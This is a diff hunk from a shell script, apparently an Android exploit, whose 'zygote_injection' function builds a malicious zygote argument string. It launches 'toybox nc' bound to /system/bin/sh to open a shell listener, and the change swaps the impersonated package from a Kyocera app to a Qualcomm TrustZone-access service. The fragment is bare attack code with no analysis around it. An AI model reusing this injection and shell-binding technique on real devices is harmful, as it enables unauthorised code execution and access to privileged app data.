@@ -120,7 +120,7 @@ zygote_injection() {
 toybox nc -s 127.0.0.1 -p %s -L /system/bin/sh -l;
 --instruction-set=arm
 --app-data-dir=/data/
---package-name=jp.kyocera.kdfs
+--package-name=com.qualcomm.qti.qms.service.trustzoneaccess
 android.app.ActivityThread
 "\n' "$uid" "$uid" "$NC_PORT"
 }
